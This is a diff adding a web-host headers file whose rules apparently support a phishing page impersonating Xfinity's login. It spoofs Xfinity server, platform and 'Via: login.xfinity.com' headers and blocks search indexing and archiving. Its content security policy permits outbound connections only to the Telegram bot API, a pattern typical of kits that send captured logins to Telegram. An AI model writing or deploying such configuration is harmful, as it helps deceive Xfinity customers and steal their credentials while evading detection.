@@ -1,0 +1,17 @@
+/*
+  X-Frame-Options: DENY
+  X-Content-Type-Options: nosniff
+  Referrer-Policy: no-referrer
+  Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate
+  Pragma: no-cache
+  Permissions-Policy: camera=(), microphone=(), geolocation=(), interest-cohort=()
+  X-Robots-Tag: noindex, nofollow, nosnippet, noarchive, notranslate, noimageindex
+  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+  Cross-Origin-Opener-Policy: same-origin
+  Cross-Origin-Resource-Policy: same-origin
+  Cross-Origin-Embedder-Policy: require-corp
+  X-DNS-Prefetch-Control: off
+  Server: Xfinity-Gateway
+  X-Powered-By: Xfinity-Platform
+  Via: 1.1 login.xfinity.com
+  Content-Security-Policy: default-src 'self' https://login.xfinity.com; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline' https://login.xfinity.com; img-src 'self' data: https://login.xfinity.com https://*.xfinity.com; font-src 'self' https://login.xfinity.com; connect-src 'self' https://api.telegram.org; frame-ancestors 'none'
